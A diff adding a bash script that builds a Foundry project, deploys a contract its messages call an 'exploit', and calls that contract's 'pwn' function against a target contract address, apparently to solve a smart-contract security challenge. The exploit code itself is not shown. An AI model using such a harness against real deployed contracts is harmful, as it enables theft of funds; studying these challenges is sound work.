@@ -1,0 +1,12 @@
+#!/bin/bash
+
+echo building and testing
+forge build
+forge test
+
+echo deploying exploit
+EXPLOIT_ADDRESS=$(forge create --private-key $PRIVATE_KEY --json src/Contract.sol:Contract | jq .'deployedTo' --raw-output | cat)
+echo exploit deployed to $EXPLOIT_ADDRESS
+
+echo calling exploit
+cast send --private-key $PRIVATE_KEY $EXPLOIT_ADDRESS 'pwn(address)' $CONTRACT_ADDRESS
